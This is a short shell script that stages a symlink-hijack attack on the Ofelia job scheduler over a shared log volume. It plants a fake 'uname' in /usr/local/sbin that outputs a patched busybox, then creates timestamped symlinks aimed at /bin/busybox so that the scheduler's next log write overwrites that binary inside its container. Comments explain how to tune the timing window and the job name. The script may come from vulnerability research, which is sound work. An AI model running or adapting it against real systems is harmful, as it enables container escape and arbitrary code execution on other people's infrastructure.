#!/bin/sh
#Staging script for hijacking Ofelia job log write on shared log volume mount
#Write shadow binary for uname that gets executed by periodic Ofelia job
mkdir -p /usr/local/sbin
printf "#!/bin/sh\ncat /tmp/busybox_patched\n" > /usr/local/sbin/uname
chmod 755 /usr/local/sbin/uname
now=$(date -u +%s)
i=0
#This part does the log filename anticipation symlink hijack to write back into the Ofelia container on periodic log job write.
#Generates symlinks with timestamps targetting any write in the next 60 seconds.
#Make longer if needed.
interval=60
#change job name to match the log for the job run in the managed container
jobname=nginx-uname-job
while [ $i -lt $interval ]; do
  t=$(date -u -d "@$((now+i))" +%Y%m%d_%H%M%S)
  ln -sf /bin/busybox "/tmp/${t}_${jobname}.stdout.log"
  i=$((i+1))
done

